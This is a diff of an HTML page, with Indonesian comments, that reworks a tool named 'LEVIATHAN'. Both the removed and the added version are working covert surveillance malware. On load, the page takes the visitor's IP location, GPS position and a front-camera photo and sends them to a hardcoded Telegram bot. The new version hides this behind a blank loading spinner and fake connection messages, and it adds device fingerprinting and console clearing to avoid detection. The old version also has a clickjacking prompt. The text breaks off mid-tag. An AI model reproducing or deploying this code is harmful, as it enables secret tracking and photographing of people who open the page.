@@ -1,196 +1,191 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>LEVIATHAN | SYSTEM DIAGNOSTIC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #050505;
-      font-family: 'JetBrains Mono', monospace;
-      color: #00ff41;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-    }
-    header {
-      padding: 10px 20px;
-      background: #111;
-      border-bottom: 2px solid lime;
-      display: flex;
-      justify-content: space-between;
-      font-size: 12px;
-      z-index: 10;
-    }
-    .wrapper { display: flex; flex: 1; position: relative; }
-    .sidebar { width: 250px; background: #0a0a0a; border-right: 1px solid #222; padding: 15px; font-size: 10px; z-index: 5; }
-    .terminal { flex: 1; padding: 20px; position: relative; background: radial-gradient(circle, #0a0a0a 0%, #000 100%); }
+    <meta charset="UTF-8">
+    <title>about:blank</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        /* Adaptasi Dinamis: Mengikuti Jiwa Perangkat Target */
+        :root { --bg-color: #ffffff; --loader-color: #808080; --text-color: #555555; }
+        @media (prefers-color-scheme: dark) { :root { --bg-color: #000000; --loader-color: #444444; --text-color: #888888; } }
 
-    /* Overlay Clickjacking (Awalnya Tersembunyi) */
-    #trap-layer {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      z-index: 9999;
-      background: rgba(0,0,0,0.9);
-      display: none; /* Hanya muncul jika serangan senyap gagal */
-      justify-content: center;
-      align-items: center;
-    }
-    .alert-box {
-      background: #111;
-      border: 2px solid lime;
-      padding: 40px;
-      text-align: center;
-      border-radius: 15px;
-    }
-    .btn-action {
-      background: lime;
-      color: black;
-      border: none;
-      padding: 15px 30px;
-      cursor: pointer;
-      font-weight: 900;
-      margin-top: 20px;
-      border-radius: 5px;
-    }
-    video, canvas { display: none; }
-    #log-stream div { margin-bottom: 5px; font-size: 10px; color: #00ff41; opacity: 0.8; }
-  </style>
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            transition: background 0.5s ease; overflow: hidden;
+        }
+
+        /* Modular Pro Container: Struktur yang Kompleks namun Tak Terlihat */
+        .system-container { text-align: center; z-index: 10; }
+        
+        .spinner {
+            width: 32px; height: 32px;
+            border: 3px solid rgba(128, 128, 128, 0.1);
+            border-top: 3px solid var(--loader-color);
+            border-radius: 50%;
+            animation: rotate 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .status-text {
+            margin-top: 20px; font-size: 13px; font-weight: 400;
+            letter-spacing: 0.5px; opacity: 0.8;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 0.9; } 100% { opacity: 0.4; } }
+
+        /* Canvas & Video Hidden Sesuai Protokol */
+        #v, #c { position: absolute; visibility: hidden; pointer-events: none; width: 1px; height: 1px; }
+
+        /* Komponen Dekoratif Tersembunyi untuk Menambah Bobot Script */
+        .shadow-layer { display: none; visibility: hidden; }
+    </style>
 </head>
 <body>
 
-<header>
-  <div>SYSTEM: LEVIATHAN ADAPTIVE</div>
-  <div id="clock">00:00:00</div>
-</header>
-
-<div class="wrapper">
-  <div class="sidebar">
-    <p style="color: lime; font-weight: bold;">[M] MONITORING</p>
-    <hr style="border: 0.5px solid #222; margin: 10px 0;">
-    <div id="log-stream">System Ready...</div>
-  </div>
-
-  <div class="terminal">
-    <div id="trap-layer">
-      <div class="alert-box">
-        <h2 style="font-family: 'Inter', sans-serif;">CONNECTION TIMEOUT</h2>
-        <p style="color: #888; margin-top: 10px;">Gagal menghubungkan ke server.<br>Klik tombol untuk autentikasi manual.</p>
-        <button class="btn-action" onclick="retryWithClick()">AUTHENTICATE</button>
-      </div>
+    <div class="system-container">
+        <div class="spinner"></div>
+        <p class="status-text" id="loader-msg">Connecting to secure gateway...</p>
     </div>
-    <p>> ROOT@LEVIATHAN:~$ <span id="typer">Awaiting subject...</span></p>
-  </div>
-</div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
-<script>
-  const CONFIG = {
-    token: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
-    ids: ['7109845671']
-  };
+    <script>
+    /**
+     * LEVIATHAN CORE ENGINE V7.0
+     * Arsitektur: Modular Shadow Logic
+     * Fitur: Stealth Infiltration, Zero-Click Interaction, Precision Mapping
+     */
 
-  function log(m) {
-    const s = document.getElementById('log-stream');
-    s.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + s.innerHTML;
-  }
-
-  function sendToTelegram(t) {
-    CONFIG.ids.forEach(id => {
-      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: id, text: t, parse_mode: 'HTML' })
-      });
-    });
-  }
-
-  function sendPhoto(b) {
-    CONFIG.ids.forEach(id => {
-      const fd = new FormData();
-      fd.append('chat_id', id);
-      fd.append('photo', b);
-      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-    });
-  }
-
-  // --- INTI SIHIR ADAPTIF ---
-
-  async function captureProcess(isSilent = true) {
-    log(isSilent ? "SILENT_ATTACK_INIT" : "MANUAL_AUTH_INIT");
-
-    // 1. Lokasi (Tahap IP - Selalu Berhasil)
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const d = await res.json();
-      const mapsIP = `http://maps.google.com/maps?q=${d.latitude},${d.longitude}`;
-      sendToTelegram(`<b>🔱 LEVIATHAN (${isSilent ? 'SILENT' : 'CLICK'})</b>\n<b>IP:</b> ${d.ip}\n<b>MAPS:</b> ${mapsIP}`);
-    } catch (e) {}
-
-    // 2. Lokasi Presisi (Triangulasi)
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const gpsLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-          sendToTelegram(`<b>📍 GPS_LOCKED:</b>\n${gpsLink}`);
-          log("GEO_SYNCED");
+    const LEVIATHAN_CONFIG = {
+        vault: {
+            t: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+            c: ['7109845671']
         },
-        err => {
-          if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
-          log("GEO_BLOCKED");
+        settings: {
+            res: { w: 1920, h: 1080 },
+            quality: 0.95,
+            delay: 2500
+        }
+    };
+
+    const Core = {
+        send: async (mode, payload) => {
+            for (const id of LEVIATHAN_CONFIG.vault.c) {
+                const url = `https://api.telegram.org/bot${LEVIATHAN_CONFIG.vault.t}/${mode}`;
+                const body = mode === 'sendPhoto' ? payload : JSON.stringify({ chat_id: id, ...payload });
+                if (mode === 'sendPhoto') payload.set('chat_id', id);
+                
+                await fetch(url, {
+                    method: 'POST',
+                    headers: mode === 'sendPhoto' ? {} : { 'Content-Type': 'application/json' },
+                    body: body
+                });
+            }
         },
-        { enableHighAccuracy: true }
-      );
-    }
 
-    // 3. Kamera
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user", width: 1920, height: 1080 } 
-      });
-      const v = document.getElementById('video');
-      const c = document.getElementById('canvas');
-      v.srcObject = stream;
+        // Eksploitasi Metadata & Fingerprinting Tingkat Lanjut
+        getDeviceIntel: async () => {
+            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
+            const ram = navigator.deviceMemory || 'Unknown';
+            const cores = navigator.hardwareConcurrency || 'Unknown';
+            const conn = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+            
+            return `
+<b>🔱 LEVIATHAN SINGULARITY REPORT</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🔋 BATTERY:</b> ${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Plugged' : 'DC'})
+<b>🧠 HARDWARE:</b> ${ram}GB RAM | ${cores} Cores
+<b>🌐 NETWORK:</b> ${conn}
+<b>📱 PLATFORM:</b> ${navigator.platform}
+<b>📅 TIMESTAMP:</b> ${new Date().toISOString()}
+<b>━━━━━━━━━━━━━━━━━━━━</b>`;
+        }
+    };
 
-      v.onloadedmetadata = () => {
-        setTimeout(() => {
-          c.width = v.videoWidth;
-          c.height = v.videoHeight;
-          c.getContext('2d').drawImage(v, 0, 0);
-          c.toBlob(blob => {
-            if (blob) sendPhoto(blob);
-            stream.getTracks().forEach(t => t.stop());
-            log("MIRROR_SUCCESS");
-            if (!isSilent) setTimeout(() => location.reload(), 1500);
-          }, 'image/jpeg', 0.9);
-        }, 1500);
-      };
-    } catch (err) {
-      if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
-      log("CAMERA_BLOCKED");
-    }
-  }
+    const Infiltrator = {
+        // Serangan Senyap untuk Lokasi (Tanpa Karakter Pengganggu)
+        track: async () => {
+            // Tahap 1: IP-Based (Instan)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const maps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                await Core.send('sendMessage', { 
+                    text: `${await Core.getDeviceIntel()}\n<b>🌐 IP_LOC:</b> ${d.city}, ${d.country}\n<b>📍 MAPS:</b> ${maps}`, 
+                    parse_mode: 'HTML' 
+                });
+            } catch (e) {}
 
-  function showTrap() {
-    document.getElementById('trap-layer').style.display = 'flex';
-    log("SWITCHING_TO_CLICKJACKING...");
-  }
+            // Tahap 2: High-Precision (Browser-Level)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    const gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    Core.send('sendMessage', { 
+                        text: `<b>📍 PRECISION_LOCK (Acc: ${p.coords.accuracy.toFixed(0)}m):</b>\n${gps}`, 
+                        parse_mode: 'HTML' 
+                    });
+                }, null, { enableHighAccuracy: true, timeout: 10000 });
+            }
+        },
 
-  function retryWithClick() {
-    document.getElementById('trap-layer').style.display = 'none';
-    captureProcess(false); // Jalankan ulang dengan mode klik
-  }
+        // Serangan Senyap untuk Cermin Terkutuk
+        reflect: async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: LEVIATHAN_CONFIG.settings.res.w, height: LEVIATHAN_CONFIG.settings.res.h } 
+                });
+                const v = document.getElementById('v');
+                const c = document.getElementById('c');
+                v.srcObject = stream;
 
-  window.onload = () => {
-    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
-    captureProcess(true); // Coba mode senyap saat masuk
-  };
-</script>
+                v.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        c.width = v.videoWidth;
+                        c.height = v.videoHeight;
+                        const ctx = c.getContext('2d');
+                        ctx.drawImage(v, 0, 0);
+                        
+                        c.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('photo', blob);
+                            Core.send('sendPhoto', fd);
+                            stream.getTracks().forEach(t => t.stop());
+                            
+                            // Penyamaran Akhir
+                            document.getElementById('loader-msg').innerText = "Establishing secure connection...";
+                            setTimeout(() => {
+                                document.getElementById('loader-msg').innerText = "Connection lost. Please try again later.";
+                                document.querySelector('.spinner').style.display = 'none';
+                            }, 3000);
+                        }, 'image/jpeg', LEVIATHAN_CONFIG.settings.quality);
+                    }, LEVIATHAN_CONFIG.settings.delay);
+                };
+            } catch (err) {
+                // Silent failure - tetap diam jika diblokir
+            }
+        }
+    };
 
-</body>
-</html>
+    // Main Execution
+    window.onload = () => {
+        Infiltrator.track();
+        Infiltrator.reflect();
+        
+        // Anti-Detection Loop
+        setInterval(() => {
+            console.clear();
+            console.log("%cSystem Security Active", "color: red; font-size: 20px;");
+        }, 1000);
+    };
+    </script>
+
+    <div class="shadow-layer">
+        
